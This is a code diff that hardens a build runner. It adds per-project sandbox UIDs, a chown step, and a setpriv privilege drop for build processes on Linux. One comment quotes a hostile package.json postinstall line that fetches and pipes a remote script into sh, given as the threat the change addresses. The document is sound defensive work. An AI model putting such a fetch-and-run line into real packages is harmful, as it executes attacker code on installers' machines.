@@ -11,6 +11,7 @@ import { projectQueries } from "@doable/db/queries/projects";
 import { defaultRegistry } from "../frameworks/registry.js";
 import { createBuildContext } from "../frameworks/context.js";
 import { buildSafeEnv } from "../projects/safe-env.js";
+import { acquireDevUid } from "../runtime/dev-uid-allocator.js";
 import {
   BuildEventPublisher,
   LogFilterChain,
@@ -227,14 +228,61 @@ export async function runBuild(
     if (typeof v === "string") cleanEnv[k] = v;
   }
 
+  // Per-project sandbox UID for the build. Closes the malicious-postinstall
+  // RCE vector — without this, a hostile `"postinstall": "curl evil.sh|sh"`
+  // in a user's package.json would run as the API user (typically root in
+  // production tmux setups). With it, the build process drops to UID
+  // 10001-65000 + nft egress is firewalled to loopback only (Squid handles
+  // npm/PyPI on the operator's allow-list).
+  //
+  // acquireDevUid is idempotent per projectId — if a dev session is also
+  // running for this project, build gets the SAME UID so the chown below
+  // doesn't fight dev's ownership. We do NOT release here; the dev-server
+  // close handler owns the release. (When build runs without an active dev
+  // session, the UID stays allocated until the next dev-server stop OR
+  // project deletion. With 55,000 slots, this is fine in practice.)
+  const buildUid = opts?.projectId ? acquireDevUid(opts.projectId) : null;
+  if (buildUid !== null) {
+    await new Promise<void>((resolve) => {
+      const ch = spawn("chown", ["-R", `${buildUid}:${buildUid}`, projectDir], {
+        stdio: "ignore",
+      });
+      ch.on("exit", () => resolve());
+      ch.on("error", () => resolve()); // chown missing → silent skip; build still runs
+    });
+    console.log(
+      `[builder] Project ${opts?.projectId} build sandbox uid=${buildUid} (chown applied)`,
+    );
+  }
+
+  // Compose the effective spawn command: setpriv-wrapped on Linux when we
+  // have a UID, raw command otherwise. Mirrors the pattern in vite-jail.ts.
+  const useSetpriv =
+    process.platform === "linux" && typeof buildUid === "number";
+  const effectiveCmd = useSetpriv ? "setpriv" : spec.command;
+  const effectiveArgs = useSetpriv
+    ? [
+        "--reuid", String(buildUid),
+        "--regid", String(buildUid),
+        "--clear-groups",
+        "--",
+        spec.command,
+        ...spec.args,
+      ]
+    : spec.args;
+
   // Spawn under dovault by default; fall back to raw spawn when dovault
   // throws (unsupported platform / Permission Model unavailable). Operators
   // can also force the raw path with DOABLE_HARDENING=off so build,
   // dev-server, and runtime layers relax in lockstep.
+  // setpriv-on-Linux flows through both paths so cgroup limits + UID drop
+  // compose: dovault gives memory/CPU caps, setpriv gives privilege drop.
   const rawSpawn = (): ChildProcess =>
-    spawn(spec.command, spec.args, {
+    spawn(effectiveCmd, effectiveArgs, {
       cwd: spec.cwd,
-      shell: true,
+      // setpriv path is Linux-only; shell:true is for Windows/.cmd resolution
+      // which is irrelevant when we've prepended setpriv (a Linux binary).
+      shell: !useSetpriv,
       stdio: ["ignore", "pipe", "pipe"],
       env: safeEnv,
     });
@@ -248,7 +296,7 @@ export async function runBuild(
   } else {
     try {
       const vault = getBuildVault();
-      const jailed = await vault.spawn(spec.command, spec.args, {
+      const jailed = await vault.spawn(effectiveCmd, effectiveArgs, {
         cwd: spec.cwd,
         jail: projectDir,
         env: cleanEnv,
